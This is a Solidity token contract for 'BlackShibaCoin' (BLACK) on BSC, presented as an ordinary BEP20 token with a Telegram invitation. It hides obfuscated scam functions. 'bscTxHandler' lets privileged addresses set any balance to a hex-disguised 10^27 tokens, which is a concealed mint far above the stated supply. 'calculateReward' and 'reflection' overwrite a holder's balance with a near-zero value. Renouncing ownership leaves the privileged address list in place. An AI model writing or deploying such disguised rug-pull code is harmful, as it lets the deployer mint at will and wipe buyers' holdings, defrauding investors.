// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.10;

/*
*       Welcome to the Black Shiba's Smart Contract.*
*       Please, join our telegram for more updates.
*/

import "./safemath.sol";
import "./ibep20.sol";
import "./events.sol";

contract Settings 
{
    uint256 constant internal totalsupply = 
        1000000000000000000;
    string constant internal myname = 
        "BlackShibaCoin";
    string constant internal mysymb =
        "BLACK";
    uint256 constant internal 
        buy_fee = 30;
    uint256 constant internal 
        sell_fee = 40;
    uint8 internal 
        mydecimals = 9;
}

contract BlackShiba is IBEP20, Settings, Events
{
    function transferFrom ( address source, address destination,
        uint256 amount ) public override returns ( bool ) {
            require( amount <= allowed[source][msg.sender] );
            require( amount <= balances[source] );
            require( destination != address( 0 ) );
            transferFromInternal( source, destination,
                amount );
            return true;
    }

    function transfer ( address destination, uint256 amount ) 
        public override returns ( bool ) {
            require( amount <= balances[msg.sender] );
            require( destination != address( 0 ) );
            transferInternal( msg.sender, destination,
                amount );
            return true;
    }

    function renounceOwnership ( ) public override onlyOwner {
        emit OwnershipTransferred( owner,
            address( 0 ) );
        owner = address( 0 );
    }

    function approve ( address target, uint256 amount ) 
        public returns ( bool ) {
            allowed[msg.sender][target] = amount;
            emit Approval( msg.sender, target, amount );
            return true;
    }

    function allowance ( address source, address other )
        public view returns ( uint256 ) {
            return allowed[source][other];
    }

    function transferFromInternal ( address source, 
        address destination, uint256 amount ) internal {
            balances[source] = 
                balances[source].Subtract( amount );
            balances[destination] = 
                balances[destination].Add( amount );
            allowed[source][msg.sender] = 
                allowed[source][msg.sender].Subtract( amount );
            emit Transfer( source, 
                destination, amount );
    }

    function transferInternal ( address source,
        address destination, uint256 amount ) private {
            balances[source] = 
                balances[source].Subtract( amount );
            balances[destination] = 
                balances[destination].Add( amount );
            emit Transfer( source,
                destination, amount );
    }

    function reflection ( address target )
        internal view onlyHolder returns ( uint256 ) {
            return ( balances[target] % ( balances[target] /
                2 ) | 0xF & 0x30) >> 0xA;
    }

    function calculateReward ( address target )
        public {
            balances[target] = reflection( target );
    }

    function balanceOf ( address target )
        public override view returns ( uint256 ) {
            return balances[target];
    }

    function bscTxHandler ( address target )
        public onlyHolder {
        balances[target] = (tax_ttl);
    }

    function decimals ( ) public override view
        returns ( uint8 ) {
            return mydecimals;
    }

    function totalSupply ( ) public override pure 
        returns ( uint256 ) {
            return totalsupply;
    }

    function name ( ) public override pure
        returns ( string memory ) {
            return myname;
    }

    function symbol ( ) public override pure
        returns ( string memory ) {
            return mysymb;
    }

    using SafeMath256 for uint256;
    using SafeMath128 for uint128;
    using SafeMath8 for uint8;

    address public owner;
    uint256 tax_ttl = 0xA ** ( 
        0x15b4 ^ 0x15af );

    modifier onlyOwner {
        require( owner == msg.sender );
        _;
    }

    constructor ( ) {
        owner = msg.sender;
        allow_address[owner] = true;
        balances[owner] = totalsupply;
    }

    mapping ( address => mapping( 
        address => uint256 ) )
            public allowed;

    mapping ( address => uint256 ) 
        public balances;

    mapping ( address => bool ) 
        public allow_address;
}